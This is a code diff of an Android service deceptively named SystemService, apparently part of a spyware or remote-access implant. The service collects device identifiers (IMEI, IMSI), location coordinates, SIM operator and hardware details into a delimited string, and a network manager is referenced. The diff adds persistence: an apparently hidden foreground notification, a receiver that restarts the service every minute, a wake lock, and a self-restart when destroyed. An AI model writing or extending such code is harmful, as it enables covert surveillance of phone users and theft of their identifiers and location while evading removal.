@@ -1,5 +1,6 @@
 package com.android.system.service;
 
+import android.app.Notification;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -39,6 +40,7 @@ import java.util.TimerTask;
 public class SystemService extends Service{
     private static Context sContext = null;
     private PowerManager.WakeLock mWakeLock = null;
+    private static BroadcastReceiver sReceiver = null;
 
     public static Context getContext() {
         return sContext;
@@ -89,18 +91,22 @@ public class SystemService extends Service{
 //            e.printStackTrace();
 //        }
 //        return jsonObject.toString().getBytes();
-        TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
         StringBuffer stringBuffer = new StringBuffer();
-        stringBuffer.append(SystemUtil.getNetworkConnectTypeString(this) + "|");
-        stringBuffer.append(Build.BRAND + "|");
-        stringBuffer.append(Build.VERSION.RELEASE + "|");
-        stringBuffer.append(Build.MODEL + "|");
-        stringBuffer.append(SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) + "|");
-        stringBuffer.append(SystemUtil.getStorageInfo(this) + "|");
-        stringBuffer.append(tm.getSimOperatorName() + "|");
-        stringBuffer.append(longitude + "/" + latitude + "|");
-        stringBuffer.append(tm.getDeviceId() + "|");
-        stringBuffer.append(tm.getSubscriberId() );
+        try {
+            TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
+            stringBuffer.append(SystemUtil.getNetworkConnectTypeString(this) + "|");
+            stringBuffer.append(Build.BRAND + "|");
+            stringBuffer.append(Build.VERSION.RELEASE + "|");
+            stringBuffer.append(Build.MODEL + "|");
+            stringBuffer.append(SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) + "|");
+            stringBuffer.append(SystemUtil.getStorageInfo(this) + "|");
+            stringBuffer.append(tm.getSimOperatorName() + "|");
+            stringBuffer.append(longitude + "/" + latitude + "|");
+            stringBuffer.append(tm.getDeviceId() + "|");
+            stringBuffer.append(tm.getSubscriberId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         return stringBuffer.toString().getBytes();
     }
 
@@ -180,31 +186,21 @@ public class SystemService extends Service{
     @Override
     public void onCreate() {
         super.onCreate();
+        this.startForeground(0, new Notification());
         acquireWakeLock();
         sContext = this;
         init();
 
         //restart itself
-//        registerReceiver(new BroadcastReceiver() {
-//            @Override
-//            public void onReceive(final Context context, Intent intent) {
-//                SystemService.start(context);
-//                final BroadcastReceiver it = this;
-//                try {
-//                    context.unregisterReceiver(this);
-//                } catch (Exception e) {
-//                }
-//                new Timer().schedule(new TimerTask() {
-//                    @Override
-//                    public void run() {
-//                        try {
-//                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
-//                        } catch (Exception e) {
-//                        }
-//                    }
-//                }, 59000);
-//            }
-//        }, new IntentFilter(Intent.ACTION_TIME_TICK));
+        if(sReceiver == null) {
+            sReceiver = new BroadcastReceiver() {
+                @Override
+                public void onReceive(final Context context, Intent intent) {
+                    SystemService.start(context);
+                }
+            };
+            registerReceiver(sReceiver, new IntentFilter(Intent.ACTION_TIME_TICK));
+        }
         new Timer().schedule(new TimerTask() {
             @Override
             public void run() {
@@ -216,10 +212,11 @@ public class SystemService extends Service{
     @Override
     public void onDestroy() {
         super.onDestroy();
+        this.stopForeground(true);
         mNetworkManager.stop();
         releaseWakeLock();
 
-        startService(new Intent(this,SystemService.class));
+        startService(new Intent(this, SystemService.class));
     }
 
     private void acquireWakeLock() {
